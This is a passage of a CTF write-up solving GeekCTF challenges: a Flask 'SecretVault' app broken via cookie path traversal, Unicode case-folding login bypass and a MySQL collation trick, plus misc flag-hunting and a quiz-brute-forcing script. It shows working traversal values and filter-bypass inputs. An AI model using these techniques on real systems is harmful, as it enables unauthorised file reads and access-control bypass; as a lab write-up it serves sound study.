├── requirements.txt
└── templates
    ├── base.html
    ├── index.html
    └── login.html
```

There are also 2 interesting links that we can access from the current html:

`color-picker.js`, which shows that the different colour schemes used in the website are done via cookies, where the `asset` field of the cookie contains a string such as `/asset/css/pico.<COLOUR>.min.css`. We see that it attempts to derive a colour from this, else falls back on a default colour `azure`.
```js
...
const colors = [
  "amber",
  ...
  "zinc",
];

function renderColorPicker() {
  const colorPicker = document.querySelector("#color-picker");
  let selectedColor = document.cookie.split(";").map((cookie) => { return cookie.trim().split("=") }).find((cookie) => { return cookie[0] === "asset" });
  colors.forEach((color) => {
    const option = document.createElement("option");
    option.value = color;
    option.textContent = color.charAt(0).toUpperCase() + color.slice(1);
    if ((selectedColor && selectedColor[1].includes(color)) || (!selectedColor && color === "azure")) {
      option.selected = true;
    }
    colorPicker.appendChild(option);
  });
}
```

We also have `/redirectCustomAsset` which we find in the header of `/login`, evidently linking us to the CSS stylesheet being used. A GET query to `/redirectCustomAsset` would read the current file that's used for the stylesheet.
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/redirectCustomAsset">
```

This is where Local File Inclusion comes in, where we abuse being able to manipulate the `Asset:...` of our cookies to be able to read files that we shouldn't be able to! With the file directory provided, we first try `Asset: assets/../app.py` but `/redirectCustomAsset` gives a string `Hacker!`. So there is a filter.

After some bit of fuzzing we find that `assets/css/../../` works for bypassing the filter. Reloading `/redirectCustomAsset` with `Asset:assets/css/../../app.py` leaks the entire contents of the Flask application. We notice the use of `SQLAlchemy`, a database for notes as well as a few `@app.routes` responsible for html navigation,

`app.py`
```py
@app.route("/redirectCustomAsset")
def redirectCustomAsset():
    asset = request.cookies.get("asset", "assets/css/pico.azure.min.css")
    if not asset.startswith("assets/css/"): # ah, the weak filter
        return "Hacker!", 400
    return send_from_directory("", asset)

@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get("logged_in"):
        return redirect("/")

    def isEqual(a, b):
        return a.lower() != b.lower() and a.upper() == b.upper()

    if request.method == "GET":
        return render_template("login.html")
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    if isEqual(username, "alice") and isEqual(password, "start2024"):
        session["logged_in"] = True # creds to login to the session
        session["role"] = "user"
        return redirect("/")
    elif username == "admin" and password == os.urandom(128).hex():
        session["logged_in"] = True # admin...seems like we cant get the password at all
        session["role"] = "admin"
        return redirect("/")
    else:
        return render_template("login.html", error="Invalid username or password.")
```

Let's start with logging into the server. A valid pair (`alice`, `start2024`) would work, but we need to pass `isEqual()` which requires...unequal lowercase and equal uppercases to the plaintext strings? This might seem impossible to fulfill at first, but fortunately there is a way to bypass -- in the form of python unicode chars. Certain unicode characters, such as `ı`, has `.lower()` `ı` and `.upper()` `I`, for example. 

A string like `alıce` would have `alıce` as its `.lower()` output and `ALICE` as its `.upper()` output. Thus `isEqual('aıice','alice')` returns True.

We run a simple python script that finds `chr(i=0...1000)` and find two unicode characters that we can use to bypass `isEqual()`, giving us the strings `alıce` and `ſtart2024`.

We successfully log in but find that the session data is stored as some sort of web token. I did try to spoof in one by altering the header field which contained `session["role"]` but to no avail, there's probably some signaturing done on the backend.

But, looking at the relevant code in `app.py`,
```py

@app.route("/")
def index():
    if not session.get("logged_in"):
        return redirect("/login")
    with db.engine.connect() as con:
        character_set_database = con.execute(
            text("SELECT @@character_set_database")
        ).fetchone()
        collation_database = con.execute(text("SELECT @@collation_database")).fetchone()
    assert character_set_database[0] == "utf8mb4"
    assert collation_database[0] == "utf8mb4_unicode_ci"
    type = request.args.get("type", "notes").strip()
    if ("secrets" in type.lower() or "SECRETS" in type.upper()) and session.get(
        "role"
    ) != "admin":
        return render_template(
            "index.html",
            notes=[],
            error="You are not admin. Only admin can view secre<u>ts</u>.",
        )
    q = db.session.query(Notes)
    q = q.filter(Notes.type == type)
    notes = q.all()
    return render_template("index.html", notes=notes)
```
We can still get access to the secret notes if somehow,
```py
type = request.args.get("type", "notes").strip()
("secrets" NOT in type.lower() AND "SECRETS" NOT in type.upper())
```
Consider a close enough to `c` unicode string such as `Č`, with lowercase `č` and uppercase `Č`. This clearly bypasses the filter and leads to `render_template("index.html",notes=q.filter(Notes.type == "seČrets").all())`

It would seem that this does work. I think this is due to `SQLAlchemy` using a different method of normalisation than Python when dealing with special characters, of which it recognises `seČrets` to be the same as its filter field of `secrets`. We can also see that the `secrets` query gives us the flag as shown in leaked `populate.py` with the same LFI in cookies.

`populate.py`
```py
import os

from app import Notes, app, db

with app.app_context():
    db.create_all()
    if not Notes.query.filter_by(type="notes").first():
        db.session.add(Notes(title="Hello, world!", message="This is an example note."))
        db.session.add(
            Notes(
                title="Where's flag?",
                message="Flag is waiting for you inside secrets.",
            )
        )
    if not Notes.query.filter_by(type="secrets").first():
        db.session.add(
            Notes(
                title="Secret flag",
                message=os.environ.get("FLAG", "fake{flag}"),
                type="secrets",
            )
        )
    db.session.commit()
```

And so we put in `http://chall.geekctf.geekcon.top:40527/?type=se%C4%8Crets`to get the flag,
```html
  <body>
    <header class="container">
      <hgroup>
        <h1>SecretVault</h1>
        <p>Safe place to store my notes and secrets.</p>
      </hgroup>
      <select id="color-picker"
              name="color-picker"
              aria-label="Select a color you prefer..."
              required></select>
    </header>
    <main class="container">
      
  <div>
    <select id="type" name="type" required>
      <option value="notes">Notes</option>
      <option value="secrets">Secrets</option>
    </select>
    <button id="logout">Logout</button>
  </div>
  
  
    <article>
      <h2>Secret flag</h2>
      <p>flag{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1}</p>
    </article>
  

    </main>
    <script src="/jquery-3.7.1.min.js"></script>
    <script src="/color-picker.js"></script>
    <script src="/home.js"></script>
  </body>
```
`flag{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1}`
<div style="page-break-after: always;"></div>

## Misc Challs
### Welcome (612 Solves, 17 Pts)
---
Flag is given in challenge description.
`flag{welcome_geekers}`
### WhereIsMyFlag (95 Solves, 104 Pts)
---
We are told in the challenge description that the flag is in `https://github.com/awesome-ctf/2024-WhereIsMyFlag`

Opening up the github and looking through the files we find hidden away at the bottom of `schedule-ics-exporter.py`: (best seen by looking thru the commits rather than the repo code itself)
```py
    C.save_ics()
    print('[+] Done! ICS file successfully generated.')  
    # like, a LOT of spaces in here
    ;import gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))
```

We run `gzip.decompress()` and find a gzip-compressed object still. We do this twice and notice that the output is now a bunch of `\x00` null bytes and some flag characters. We remove the NULL bytes and find the flag hidden within:
```py
import gzip
import base64

s = gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))
s = gzip.decompress(s)
s = gzip.decompress(s)
s = bytes(s.replace(b'\x00',b''))
print(s)
```
`b'flag{760671da3ca23cae060262190c01e575873c72e6}\n'`
### RealOrNot (23 Solves, 333 Pts)
---
Upon interacting with the server a few times we know the following:
Upon ncatting to the server instance,
1. We are expected to solve a Proof of Work. This proof of work happens to be computable very quickly with a simple brute force.
2. We receive 20 separate base64 encoded image data
3. Server expects us to enter a 20 length string of `Y` or `N` on whether the images are AI generated or not
4. If our 20 inputs are right, server gives us the flag. Otherwise, the server will tell us one of our many wrong inputs that was wrong.

Upon multiple queries we begin to notice a collision between the base64 encoded data. It appears there is only a set possibility of images from the server. Solving the challenge thus becomes trivial;

Over multiple connections to the server, send `YYY....YYY` strings, with `N` on images that we know are fake. Upon a wrong input, we update a dictionary matching the base64 encoded data to `N` as necessary. Eventually our dictionary should be large enough that we encounter a series of 20 images that we can correctly identify to be AI-generated. We would therefore send the right string and get the flag!

There is a problem in that the `ncat` provided involves connecting to a server and then to a proxy instance within it; The typical Python `pwntools` library does not provide for this as far as I'm aware, so we make up for it using `subprocess.popen`..albeit in a shifty way.

Solve script
```py
import string
from hashlib import sha256
import random

def long_to_char(x):
    alphabet = string.ascii_letters + string.digits
    out = ""
    while x > 0:
        out += alphabet[x % len(alphabet)]
        x //= len(alphabet)
    return out.encode()

# def generate_pow_challenge(difficulty=4):
#     challenge = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
#     prefix = "0" * difficulty
#     print(f"PoW Challenge: SHA256(solution + '{challenge}') must start with '{prefix}'.")
#     return challenge, prefix

# def verify_pow_solution(challenge, solution, prefix):
#     guess = solution + challenge
#     guess_hash = sha256(guess.encode()).hexdigest()
#     return guess_hash.startswith(prefix)

def get_pow(challenge_string):
    _, challenge, _, prefix, _ = challenge_string.split(b"'")
    print(challenge, prefix)
    x = 1
    ll = 0
    while True:
        solution = long_to_char(x)
        if sha256(solution + challenge).hexdigest().startswith(prefix.decode()):
            break
        x += 1
    return solution

def getline(p):
    while True:
        line = p.stdout.readline()
        if line:
            break
    return line

from subprocess import Popen, PIPE
from tqdm import trange

known = {}
x = 1
while True:
    print(f'Round {x}')
    imgs = []
    knowns = []
    cmd = "nc -X connect -x instance.chall.geekctf.geekcon.top:18081 m9gv8gq496hgmrtp 1"
    p = Popen(cmd,shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
    line = getline(p)
    solution = get_pow(line)
    print(f'Found solution {solution}')
    p.stdin.write(solution + b'\n')
    p.stdin.flush()
    ans = b''
    for i in trange(20):
        getline(p)
        getline(p) # b'Round 1: Is this picture real or not (Y/N)? \n'
        b64_data = sha256(getline(p)).hexdigest()
        imgs.append(b64_data)
        if b64_data in known:
            ans += known[b64_data]
            knowns.append(i+1)
        else:
            ans += b'Y'
    print(f'Rounds known: {knowns}')
    print(f'answer string: {ans}')
    out = p.communicate(input=ans+b'\n')[0] # stdout
    print(out) # eventually this prints the flag string!
    assert len(imgs) == 20
    if b'Incorrect answer' in out:
        round_num = int(out[out.index(b'Round ')+len(b'Round '):out.index(b'. Game over.\n\n')], 10)
        key = imgs[round_num-1]
        prev = known[key] if key in known else b'?'
        known[key] = b'N'
        x += 1
    else:
        break
```

```sh
Round 37
b'oGzloZpSAdbq759F' b'0000'
Found solution b'5XR'
100%|███████████████████████████████████████████████████████████████████████████████████| 20/20 [00:08<00:00,  2.25it/s]
Rounds known: [9, 10, 14, 15, 18]
answer string: b'YYYYYYYYNNYYYNNYYNYY'
b'Incorrect answer for Round 2. Game over.\n\n'
Known length: 37
Round 38
b'cVwRKzRqadWfoCA5' b'0000'
Found solution b'00d'
100%|███████████████████████████████████████████████████████████████████████████████████| 20/20 [00:06<00:00,  3.04it/s]
Rounds known: [10, 13, 16, 17]
answer string: b'YYYYYYYYYNYYNYYNNYYY'
b"Congratulations! You've completed all rounds correctly. Here is your flag: flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!}\n\n"
```
`flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!}`